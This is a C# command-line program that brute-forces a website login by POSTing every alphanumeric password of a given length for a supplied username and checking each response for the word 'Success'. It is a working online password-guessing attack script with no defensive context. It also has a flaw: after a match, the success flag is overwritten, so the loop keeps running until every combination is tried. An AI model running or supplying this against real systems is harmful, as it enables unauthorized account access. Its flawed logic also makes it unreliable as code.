using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        // Check if the correct number of arguments is provided
        if (args.Length != 3)
        {
            Console.WriteLine("Usage: dotnet run <url> <username> <passwordLength>");
            return;
        }

        // Read command-line arguments
        string url = args[0];
        string username = args[1];
        int passwordLength;

        // Validate password length argument
        if (!int.TryParse(args[2], out passwordLength))
        {
            Console.WriteLine("Error: passwordLength must be an integer.");
            return;
        }

        // Start the brute-force process
        await BruteForcePassword(url, username, passwordLength);
    }

    static async Task BruteForcePassword(string url, string username, int passwordLength)
    {
        using (HttpClient client = new HttpClient())
        {
            // Generate all possible combinations of characters for the password
            string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            int charsetLength = charset.Length;
            char[] password = new char[passwordLength];

            for (int i = 0; i < passwordLength; i++)
            {
                password[i] = charset[0]; // Initialize with the first character in the charset
            }

            bool success = false;

            // Attempt passwords by iterating through all possible combinations
            while (!success)
            {
                // Create the password string from the char array
                string passwordString = new string(password);

                // Create the HTTP POST request body
                var data = new
                {
                    username = username,
                    password = passwordString
                };

                // Convert the data into JSON format
                var json = Newtonsoft.Json.JsonConvert.SerializeObject(data);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    // Send the HTTP POST request
                    HttpResponseMessage response = await client.PostAsync(url, content);
                    string responseString = await response.Content.ReadAsStringAsync();

                    Console.WriteLine($"Trying: {passwordString} - Server Response: {response.StatusCode}");

                    // Check if the response contains "Success"
                    if (responseString.Contains("Success"))
                    {
                        Console.WriteLine($"Success! The correct password is: {passwordString}");
                        success = true;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                    return;
                }

                // Increment the password to the next combination
                success = IncrementPassword(password, charset, charsetLength);
            }
        }
    }

    static bool IncrementPassword(char[] password, string charset, int charsetLength)
    {
        // Increment the password by moving through the character set
        for (int i = password.Length - 1; i >= 0; i--)
        {
            int currentCharIndex = charset.IndexOf(password[i]);

            if (currentCharIndex < charsetLength - 1)
            {
                password[i] = charset[currentCharIndex + 1];
                return false; // Continue brute-forcing
            }

            password[i] = charset[0]; // Reset this character to the first in the charset and move to the next one
        }

        // If we've looped through all possible combinations, return true (stop brute-forcing)
        return true;
    }
}
